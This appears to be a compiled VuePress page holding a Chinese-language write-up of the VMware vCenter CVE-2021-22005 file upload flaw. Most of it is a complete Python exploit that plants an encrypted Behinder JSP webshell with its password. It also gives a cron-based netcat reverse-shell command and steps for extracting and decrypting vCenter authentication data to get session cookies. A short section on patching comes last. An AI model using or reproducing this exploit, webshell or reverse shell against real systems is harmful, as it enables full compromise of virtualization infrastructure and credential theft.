import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const c={},u=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。</p><p>2021年9月22日，VMware官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>VMware vCenter Server 7.0系列 &lt; 7.0 U2c 
VMware vCenter Server 6.7系列 &lt; 6.7 U3o 
VMware vCenter Server 6.5系列 不受漏洞影响 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),r={href:"https://www.vmware.com/security/advisories/VMSA-2021-0020.html",target:"_blank",rel:"noopener noreferrer"},d=e(`<p>安全版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>VMware vCenter Server 7.0 U2c 
VMware vCenter Server 6.7 U3o
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="exp" tabindex="-1"><a class="header-anchor" href="#exp" aria-hidden="true">#</a> EXP</h3><p>可以针对 /analytics/telemetry/ph/api/level 执行 cURL 请求来识别服务器是否受影响：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -k -v &quot;https://your-ip/analytics/telemetry/ph/api/level?_c=test&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p>如果服务器 Response 200/OK，响应内容不包含 OFF，则容易受到攻击。</p></li><li><p>如果服务器 Response 200/OK，响应内容包含 OFF，则可能不易受到攻击，且未修复。</p></li><li><p>如果服务器 Response 400/Bad Request，则已修复。</p></li><li><p>如果服务器 Response 404/Not Found，则要么不适用，要么已应用解决方法。该解决方法会禁用受影响的 API。</p></li></ul><p>漏洞 exp 部署 webshell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 CVE-2021-22005_poc.py -t https://your-ip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> argparse
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">id_generator</span><span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> chars<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>
 <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
  
<span class="token keyword">def</span> <span class="token function">escape</span><span class="token punctuation">(</span>_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
 _str <span class="token operator">=</span> _str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&amp;amp;&quot;</span><span class="token punctuation">)</span>
 _str <span class="token operator">=</span> _str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&amp;lt;&quot;</span><span class="token punctuation">)</span>
 _str <span class="token operator">=</span> _str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&amp;gt;&quot;</span><span class="token punctuation">)</span>
 _str <span class="token operator">=</span> _str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;\\&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&amp;quot;&quot;</span><span class="token punctuation">)</span>
 <span class="token keyword">return</span> _str
  
<span class="token keyword">def</span> <span class="token function">str_to_escaped_unicode</span><span class="token punctuation">(</span>arg_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
 escaped_str <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
 <span class="token keyword">for</span> s <span class="token keyword">in</span> arg_str<span class="token punctuation">:</span>
   val <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
   esc_uni <span class="token operator">=</span> <span class="token string">&quot;\\\\u{:04x}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
   escaped_str <span class="token operator">+=</span> esc_uni
 <span class="token keyword">return</span> escaped_str
 
 
<span class="token keyword">def</span> <span class="token function">createAgent</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> agent_name<span class="token punctuation">,</span> log_param<span class="token punctuation">)</span><span class="token punctuation">:</span>
 
  
 url <span class="token operator">=</span> <span class="token string">&quot;%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&amp;_i=%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> agent_name<span class="token punctuation">,</span> log_param<span class="token punctuation">)</span>
 headers <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;Cache-Control&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;max-age=0&quot;</span><span class="token punctuation">,</span> 
       <span class="token string">&quot;Upgrade-Insecure-Requests&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> 
       <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0&quot;</span><span class="token punctuation">,</span> 
       <span class="token string">&quot;X-Deployment-Secret&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;abc&quot;</span><span class="token punctuation">,</span> 
       <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span> 
       <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span> <span class="token punctuation">}</span>
       
 json_data <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;manifestSpec&quot;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
        <span class="token string">&quot;objectType&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a2&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;collectionTriggerDataNeeded&quot;</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
        <span class="token string">&quot;deploymentDataNeeded&quot;</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span> 
        <span class="token string">&quot;resultNeeded&quot;</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> 
        <span class="token string">&quot;signalCollectionCompleted&quot;</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span> 
        <span class="token string">&quot;localManifestPath&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a7&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;localPayloadPath&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a8&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;localObfuscationMapPath&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a9&quot;</span> <span class="token punctuation">}</span>
         
 requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> json<span class="token operator">=</span>json_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
  
 
<span class="token keyword">def</span> <span class="token function">generate_manifest</span><span class="token punctuation">(</span>webshell_location<span class="token punctuation">,</span> webshell<span class="token punctuation">)</span><span class="token punctuation">:</span>
 
 manifestData <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;manifest recommendedPageSize=&quot;500&quot;&gt;
   &lt;request&gt;
    &lt;query name=&quot;vir:VCenter&quot;&gt;
      &lt;constraint&gt;
       &lt;targetType&gt;ServiceInstance&lt;/targetType&gt;
      &lt;/constraint&gt;
      &lt;propertySpec&gt;
       &lt;propertyNames&gt;content.about.instanceUuid&lt;/propertyNames&gt;
       &lt;propertyNames&gt;content.about.osType&lt;/propertyNames&gt;
       &lt;propertyNames&gt;content.about.build&lt;/propertyNames&gt;
       &lt;propertyNames&gt;content.about.version&lt;/propertyNames&gt;
      &lt;/propertySpec&gt;
    &lt;/query&gt;
   &lt;/request&gt;
   &lt;cdfMapping&gt;
    &lt;indepedentResultsMapping&gt;
      &lt;resultSetMappings&gt;
       &lt;entry&gt;
         &lt;key&gt;vir:VCenter&lt;/key&gt;
         &lt;value&gt;
                      &lt;value xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:type=&quot;resultSetMapping&quot;&gt;
            &lt;resourceItemToJsonLdMapping&gt;
             &lt;forType&gt;ServiceInstance&lt;/forType&gt;
            &lt;mappingCode&gt;&lt;![CDATA[  
             #set($appender = $GLOBAL-logger.logger.parent.getAppender(&quot;LOGFILE&quot;))##
             #set($orig_log = $appender.getFile())##
             #set($logger = $GLOBAL-logger.logger.parent)##  
             $appender.setFile(&quot;%s&quot;)##  
             $appender.activateOptions()## 
             $logger.warn(&quot;%s&quot;)## 
             $appender.setFile($orig_log)##  
             $appender.activateOptions()##]]&gt;
            &lt;/mappingCode&gt;
            &lt;/resourceItemToJsonLdMapping&gt;
          &lt;/value&gt;
         &lt;/value&gt;
       &lt;/entry&gt;
      &lt;/resultSetMappings&gt;
    &lt;/indepedentResultsMapping&gt;
   &lt;/cdfMapping&gt;
   &lt;requestSchedules&gt;
    &lt;schedule interval=&quot;1h&quot;&gt;
      &lt;queries&gt;
       &lt;query&gt;vir:VCenter&lt;/query&gt;
      &lt;/queries&gt;
    &lt;/schedule&gt;
   &lt;/requestSchedules&gt;
 &lt;/manifest&gt;&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>webshell_location<span class="token punctuation">,</span> webshell<span class="token punctuation">)</span>
  
 <span class="token keyword">return</span> manifestData
 
<span class="token keyword">def</span> <span class="token function">arg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
 parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-t&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--target&quot;</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">&quot;Target&quot;</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
 args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
 target <span class="token operator">=</span> args<span class="token punctuation">.</span>target
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] Target: %s&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">)</span>
 <span class="token keyword">return</span> target
 
<span class="token keyword">def</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 target <span class="token operator">=</span> arg<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token comment"># Variables</span>
 webshell_param <span class="token operator">=</span> id_generator<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
 log_param <span class="token operator">=</span> id_generator<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
 agent_name <span class="token operator">=</span> id_generator<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
 shell_name <span class="token operator">=</span> <span class="token string">&quot;Server.jsp&quot;</span>
 webshell <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;&quot;&quot;&quot;</span>
 
 webshell_location <span class="token operator">=</span> <span class="token string">&quot;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s&quot;</span> <span class="token operator">%</span> shell_name
 webshell <span class="token operator">=</span> str_to_escaped_unicode<span class="token punctuation">(</span>webshell<span class="token punctuation">)</span>
 manifestData <span class="token operator">=</span> generate_manifest<span class="token punctuation">(</span>webshell_location<span class="token punctuation">,</span>webshell<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*] Creating Agent&quot;</span><span class="token punctuation">)</span>
 createAgent<span class="token punctuation">(</span>target<span class="token punctuation">,</span> agent_name<span class="token punctuation">,</span> log_param<span class="token punctuation">)</span>
 url <span class="token operator">=</span> <span class="token string">&quot;%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&amp;_c=%s&amp;_i=%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> agent_name<span class="token punctuation">,</span> log_param<span class="token punctuation">)</span>
 headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Cache-Control&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;max-age=0&quot;</span><span class="token punctuation">,</span> 
          <span class="token string">&quot;Upgrade-Insecure-Requests&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> 
          <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0&quot;</span><span class="token punctuation">,</span> 
          <span class="token string">&quot;X-Deployment-Secret&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;abc&quot;</span><span class="token punctuation">,</span> 
          <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span> 
          <span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;close&quot;</span><span class="token punctuation">}</span>
 json_data <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;contextData&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a3&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;manifestContent&quot;</span><span class="token punctuation">:</span> manifestData<span class="token punctuation">,</span> <span class="token string">&quot;objectId&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;a2&quot;</span><span class="token punctuation">}</span>
 requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> json<span class="token operator">=</span>json_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
 <span class="token comment">#webshell连接地址</span>
 url <span class="token operator">=</span> <span class="token string">&quot;%s/idm/..;/%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> shell_name<span class="token punctuation">)</span>
 code <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code
 <span class="token keyword">if</span> code <span class="token operator">!=</span> <span class="token string">&quot;404&quot;</span><span class="token punctuation">:</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;webshell地址: %s&quot;</span> <span class="token operator">%</span> url<span class="token punctuation">)</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*]冰蝎3.0 Webshell连接密码: rebeyond&quot;</span> <span class="token punctuation">)</span>
 
 <span class="token keyword">else</span><span class="token punctuation">:</span>
   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;未获取到webshell地址&quot;</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
 <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>反弹Shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -kv &quot;https:/xx.xx.xx.xx/analytics/telemetry/ph/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/$RANDOM&quot; -H Content-Type: -d &quot;* * * * * root nc -e /bin/sh your-ip your-port &quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="vcenter-cookie-读取登录" tabindex="-1"><a class="header-anchor" href="#vcenter-cookie-读取登录" aria-hidden="true">#</a> vCenter cookie 读取登录</h3><p>存储关键身份验证信息数据位置：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># Linux
/storage/db/vmware-vmdir/data.mdb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#Windows
C:\\ProgramData\\VMware\\vCenterServer\\data\\vmdird\\data.mdb
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>解密脚本：</p>`,17),v={href:"https://github.com/horizon3ai/vcenter_saml_login",target:"_blank",rel:"noopener noreferrer"},k=e(`<p>运行得到 VSPHERE-UI-JESSIONID：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 vcenter_saml_login.py -p data.mdb -t your-ip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="修复方案" tabindex="-1"><a class="header-anchor" href="#修复方案" aria-hidden="true">#</a> 修复方案</h2>`,3),m=n("li",null,[n("p",null,"升级VMware vCenter Server 至最新版本。")],-1),g={href:"https://kb.vmware.com/s/article/85717",target:"_blank",rel:"noopener noreferrer"};function b(q,h){const a=o("ExternalLinkIcon");return i(),l("div",null,[u,n("p",null,[s("其余漏洞受影响版本可参考 ："),n("a",r,[s("https://www.vmware.com/security/advisories/VMSA-2021-0020.html"),t(a)])]),d,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/horizon3ai/vcenter_saml_login"),t(a)])])]),k,n("ol",null,[m,n("li",null,[n("p",null,[s("针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞，可按照 "),n("a",g,[s("https://kb.vmware.com/s/article/85717"),t(a)]),s(" 相关措施进行缓解。")])])])])}const w=p(c,[["render",b],["__file","VMware vCenter Server 任意文件上传漏洞 CVE-2021-22005.html.vue"]]);export{w as default};
